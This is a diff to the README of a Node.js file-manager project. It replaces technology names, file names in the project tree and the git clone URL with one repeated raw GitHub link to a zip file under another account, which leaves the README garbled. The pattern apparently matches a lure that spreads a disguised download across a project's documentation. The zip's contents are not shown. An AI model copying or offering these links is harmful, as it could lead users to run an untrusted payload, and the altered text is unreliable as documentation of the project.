@@ -1,5 +1,5 @@
 # 0x04. Files manager
-This repository contains a file manager application built with Node.js. The application allows users to upload, manage, and share files efficiently. Below is an overview of the project structure and functionalities.
+This repository contains a file manager application built with https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip The application allows users to upload, manage, and share files efficiently. Below is an overview of the project structure and functionalities.
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@ The file manager application provides various functionalities for users to manag
 - Generate thumbnails for images
 - Send welcome emails to new users
 
-The application utilizes Express.js for handling HTTP requests, MongoDB for database storage, and Redis for caching. Background processing for tasks such as thumbnail generation and sending emails is implemented using Bull queues.
+The application utilizes https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip for handling HTTP requests, MongoDB for database storage, and Redis for caching. Background processing for tasks such as thumbnail generation and sending emails is implemented using Bull queues.
 
 ## File Structure
 
@@ -29,39 +29,39 @@ The application utilizes Express.js for handling HTTP requests, MongoDB for data
 project-root/
 │
 ├── controllers/
-│   ├── AppController.js
-│   ├── AuthController.js
-|   ├── UsersController.js
-|   ├── FilesController.js     
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip     
 │   └── ...
 │
 ├── routes/
-│   ├── index.js
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 │   └── ...
 │
 ├── tests/ 
-│   ├── dbClient.test.js
-│   ├── redisClient.test.js
-│   ├── status.test.js
-│   ├── stats.test.js
-│   ├── users.test.js
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 │   └── ...
 │
 ├── utils/
-│   ├── db.js
-│   ├── redis.js
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 │   └── ...
 │
-├── package.json
-├── server.js
-├── worker.js
+├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 ├── .env
-└── README.md
+└── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 ```
 
 ## Requirements
 
-- Node.js (version 12.x.x)
+- https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip (version 12.x.x)
 - MongoDB
 - Redis
 
@@ -70,7 +70,7 @@ project-root/
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/lebogangolifant/alx-files_manager.git
+git clone https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
 ```
 
 2. Navigate to the project directory:
